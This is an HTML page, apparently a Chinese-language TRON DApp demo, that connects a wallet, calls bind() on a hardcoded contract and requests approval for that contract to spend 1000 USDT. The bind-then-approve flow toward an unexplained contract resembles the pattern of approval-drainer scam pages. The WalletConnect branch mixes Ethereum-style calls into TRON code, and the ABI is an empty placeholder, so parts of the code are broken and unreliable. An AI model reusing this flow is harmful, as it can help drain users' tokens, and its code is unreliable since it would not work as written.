<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <title>TRON 多钱包测试 DApp</title>
</head>
<body>
  <h2>TRON 多钱包测试 DApp</h2>

  <button onclick="connectWallet()">连接钱包</button>
  <p id="address"></p>

  <hr>

  <button onclick="bindAndApprove()">绑定并授权 USDT</button>
  <p id="status"></p>

  <!-- TronWeb -->
  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
  <!-- WalletConnect -->
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/client/dist/umd/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/qrcode-modal/dist/umd/index.min.js"></script>

  <script>
  // 合约信息
  const CONTRACT_ADDRESS = "TRZvddUZXAoriYEdrzVdMjcpF6VVVwQAis";
  const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
  const ABI = [/* 这里放你的 ABI */];

  let tronWeb;
  let contract;
  let connector;

  function setStatus(msg) {
    document.getElementById("status").innerText = msg;
  }

  async function connectWallet() {
    // 1️⃣ TronLink 检测
    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
      tronWeb = window.tronWeb;
      document.getElementById("address").innerText = "钱包地址: " + tronWeb.defaultAddress.base58;
      contract = await tronWeb.contract(ABI, CONTRACT_ADDRESS);
      setStatus("已连接 TronLink 钱包");
      return;
    }

    // 2️⃣ WalletConnect (支持 imToken、TokenPocket 等)
    connector = new WalletConnect.default({
      bridge: "https://bridge.walletconnect.org",
      qrcodeModal: WalletConnectQRCodeModal.default
    });

    if (!connector.connected) {
      await connector.createSession();
    }

    connector.on("connect", async (error, payload) => {
      if (error) throw error;

      const { accounts } = payload.params[0];
      const address = accounts[0];
      document.getElementById("address").innerText = "钱包地址: " + address;

      // 创建 TronWeb 实例，WalletConnect 交易要通过 connector.signTransaction
      tronWeb = new TronWeb({
        fullHost: "https://api.trongrid.io",
        privateKey: "" // WalletConnect 不暴露私钥
      });

      contract = await tronWeb.contract(ABI, CONTRACT_ADDRESS);
      setStatus("已连接 WalletConnect 钱包 (imToken/TokenPocket)");
    });

    connector.on("disconnect", (error, payload) => {
      setStatus("钱包已断开");
      document.getElementById("address").innerText = "";
    });
  }

  async function bindAndApprove() {
    if (!contract) {
      setStatus("请先连接钱包");
      return;
    }

    try {
      // 第一步：绑定用户
      setStatus("正在绑定用户...");
      const bindTx = await contract.bind().send();
      setStatus("绑定成功: " + bindTx);

      // 第二步：提示用户授权 USDT 1000
      setStatus("请在钱包弹窗中确认授权 1000 USDT 给合约");
      const usdt = await tronWeb.contract().at(USDT_ADDRESS);
      const fixedAmount = 1000; // 固定数量 1000 USDT

      // 如果是 WalletConnect，需要特殊处理
      if (connector && connector.connected) {
        const txData = await usdt.approve(CONTRACT_ADDRESS, fixedAmount * 1e6).encodeABI();
        const tx = {
          to: USDT_ADDRESS,
          data: txData,
          from: document.getElementById("address").innerText.replace("钱包地址: ","")
        };
        await connector.sendTransaction(tx);
        setStatus("授权成功: (建议授权 1000 USDT)");
      } else {
        // TronLink 直接调用
        const approveTx = await usdt.approve(CONTRACT_ADDRESS, fixedAmount * 1e6).send();
        setStatus("授权成功: " + approveTx + " （建议授权 1000 USDT）");
      }

    } catch (e) {
      setStatus("操作失败: " + e.message);
    }
  }
  </script>
</body>
</html>
